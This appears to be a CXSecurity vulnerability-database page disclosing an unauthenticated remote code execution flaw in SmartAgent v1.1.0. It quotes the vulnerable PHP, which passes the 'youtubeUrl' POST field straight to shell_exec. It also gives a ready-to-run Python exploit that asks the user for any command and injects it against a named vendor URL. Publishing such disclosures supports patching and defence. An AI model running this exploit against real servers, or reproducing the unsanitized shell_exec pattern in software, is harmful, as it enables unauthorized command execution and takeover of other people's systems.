---
title: SmartAgent 1.1.0 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2024110003
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-11-03
fetch_date: 2025-10-06T19:13:51.133519
---

# SmartAgent 1.1.0 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **SmartAgent 1.1.0 Remote Code Execution** **2024.11.02**  Credit:  **[Alter Prime](https://cxsecurity.com/author/Alter%2BPrime/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: SmartAgent v1.1.0 - Unauthenticated Remote Code Execution
# Date: 01-10-2024
# Exploit Author: Alter Prime
# Vendor Homepage: https://smarts-srlcom.com/, https://smartagent.com
# Version: Build v1.1.0
# Tested on: Kali Linux
An unauthenticated user can access a php script called https://smarts-srlcom.com/youtubeInfo.php from the vulnerable web application and through a POST request with vulnerable parameter "youtubeUrl" a command injection vulnerability could be triggered.
Vulnerable code snippet from youtubeInfo.php:
"""
$youtubeUrl=$\_POST["youtubeUrl"];
$command = 'youtube-dl -j ' . $youtubeUrl;
echo shell\_exec($command);
"""
Steps To Reproduce:
1. Run the below python script on a vulnerable web application instance of SmartAgent v1.1.0
#Python Exploit
import requests
url = "https://smarts-srlcom.com?youtubeInfo.php"
command = input("Enter the command you want to run \(EX: id\): ")
postdata = {
"youtubeUrl": ";" + command
}
response = requests.post(url, data=postdata, verify=False)
print(response.text)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024110003)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top